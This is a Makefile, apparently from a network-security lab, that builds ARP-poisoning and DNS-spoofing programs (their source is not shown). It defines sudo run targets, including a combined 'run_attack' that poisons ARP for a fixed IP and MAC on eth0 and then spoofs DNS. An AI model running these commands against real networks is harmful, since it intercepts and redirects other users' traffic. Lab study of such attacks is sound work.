CC=gcc
CFLAGS=-Wall
TARGETS=dns_spoof arp_poisoning

all: $(TARGETS)

dns_spoof: dns_spoof.c
	$(CC) $(CFLAGS) -o $@ $<

arp_poisoning: arp_poisoning.c
	$(CC) $(CFLAGS) -o $@ $<

.PHONY: clean
clean:
	rm -f $(TARGETS)

# Individual run targets
.PHONY: run_arp
run_arp:
	sudo ./arp_poisoning eth0 192.168.255.2 00:0c:29:db:be:bf

.PHONY: run_dns
run_dns:
	sudo ./dns_spoof

# Combined attack target - runs both in the correct order
.PHONY: run_attack
run_attack:
	@echo "Starting ARP poisoning..."
	sudo ./arp_poisoning eth0 192.168.255.2 00:0c:29:db:be:bf & \
	sleep 2 && \
	echo "Starting DNS spoofing..." && \
	sudo ./dns_spoof

# Help target
.PHONY: help
help:
	@echo "Available targets:"
	@echo "  make all         - Build DNS spoofer and ARP poisoning"
	@echo "  make dns_spoof   - Build DNS spoofer"
	@echo "  make arp_poisoning - Build ARP poisoning tool"
	@echo "  make run_attack  - Run full attack (ARP + DNS)"
	@echo "  make run_dns     - Run DNS spoofer only"
	@echo "  make run_arp     - Run ARP poisoning only"
	@echo "  make clean       - Remove built files"
